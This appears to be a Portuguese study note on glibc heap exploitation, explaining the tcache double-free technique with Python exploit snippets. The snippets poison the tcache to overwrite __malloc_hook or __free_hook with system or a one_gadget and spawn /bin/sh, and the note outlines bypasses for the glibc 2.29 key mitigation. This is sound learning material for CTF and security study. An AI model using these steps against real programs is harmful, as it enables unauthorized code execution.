- [Dup](#dup)
- [Exec](#exec)
- [Obs >= 2.29](#obs--229)
  - [UAF](#uaf)
  - [Transferencia](#transferencia)

O TCache dup é o fastbins dup, mas realizado na estrutura similar 
presente no tcache

Em versões ate 2.29, nem se quer existe a mitigação igual dos fastbins, então 
basta fazer free(chunk_A) free(chunk_A)

Dali em diante, vc precisa usar a seguinte tecnica (igual o fastbin dup):

# Dup
O Tcache facilita o exploit, nao tendo mitigação de double free nem check no 
size (então nao precisamos de find_fake_fast)

Para dar write é similar ao fastbin dup, mas ao invés de mirarmos no `alvo-16`, 
basta mirar no alvo... o tcache tem os seus fds apontando para a `data` do chunk

```py
chunk_A = malloc(0x18, "A"*8)

free(chunk_A)
free(chunk_A)

chunk_Corromper = malloc(0x18, p64(ALVO))
chunk_A = malloc(0x18, "A"*8) # Consumir
chunk_Write = malloc(0x18, "ola! :D")
```

Estranhamente, o valor do `count 0x20` da a volta e vai para 
`0xff`, isso quer dizer que nem sendo usado para chegar se pode 
alocar ele ta

# Exec 

Para conseguir uma shell, basta mirar no malloc_hook (ou outro)

Caso a sua versão tenha check no size, voce vai precisar usar 
find_fake_fast (E lembrando q find_fake_fast aponta para o inicio do chunk, então como estamos usando o TCache, voce precisa +16)


```py
chunk_A = malloc(0x18, "A"*8)

free(chunk_A)
free(chunk_A)

chunk_Corromper = malloc(0x18, p64(libc.sym.__malloc_hook))
chunk_A = malloc(0x18, "A"*8) # Consumir
chunk_Write = malloc(0x18, p64(libc.sym.system))
malloc(p64(next(libc.search(b"/bin/sh\0"))))


    (lembrando que o free_hook é fácil de corromper nesse 
    caso pq o endereço nao precisa ser alinhado a 16 bytes
    (o tcache é ruim, lembra?))

Para ser mais eficiente no numero de mallocs, voce também pode: 
    chunk_Corromper = malloc(0x18, p64(libc.sym.__free_hook))
    chunk_A = malloc(0x18, "/bin/sh\0") # Consumir
    chunk_Write = malloc(0x18, p64(libc.sym.system))
    free(chunk_A)

ou apontar para um one_gadget e ativar o hook
    chunk_Corromper = malloc(0x18, p64(libc.sym.__free_hook))
    chunk_A = malloc(0x18, "A"*8) # Consumir
    chunk_Write = malloc(0x18, p64(libc.address+ 0x41a06))
    free(12345) # O arg nao importa pra one_gadget

```

# Obs >= 2.29
## UAF
Se voce tem um UAF ou overflow, basta corromper 1 byte da key 
e depois dar free normalmente

- free A
- UAF A : corrompe key
- free A


## Transferencia
Nessa versões, voce precisa usar o método da transferência pra 
ignorar a mitigação da key

- malloc 7 chunks
- malloc o chunk do dup
- Free 7 chunks no tcache 0x20 (tcache_count=7)
- free dup (vai para o fast0x20, sem key)
- malloc 7 chunks (esvaziando o tcache 0x20)
  - bastaria so alocar 1, nos estamos fazendo isso
  para abrir espaco pro dup 
  - mas nos teriamos que esvaziar depois de qualquer maneira
  pra causar a transferencia
- free dup (vai para o tcache, ainda ta linkado no fast)
  - Agora voce pode alocar o dup (a partir do tcache), e alterar
  o fd ... assim tendo um fastbin dup
  - mas ai vc teria q lidar com as mitigacoes do fastbin
- malloc dup (do tcache) 
  - Altera o fd (como é fastbin, precisa -16)
  - voce vai apontar para o `fake`
    - a unica limitacao dele é que o fd dele precisa ser 0
    para o processo de transferencia nao tentar acessar memoria
    nao mapeada
    - o endereco dele pode ser, por exemplo, o __free_hook
    - e ele nao precisa ser alinhado a 16 bytes
  - Assim, o fake ta linkado no fast 0x20
- malloc dup de novo
  - vai transferir o fast 0x20 -> tcache 0x20 
  - o `fake` vai ser transferido nesse processo
  - Nao tem problema editar esse chunk, pq no ponto que ele puder ser editado,
  o fake ja foi transferido
  - Por isso, voce pode user ele pra armazenar /bin/sh e chamar free nele
- malloc fake (pelo tcache)
  - corrompe o free_hook com system
- free(chunk do /bin/sh)

E assim temos o nosso dup :D
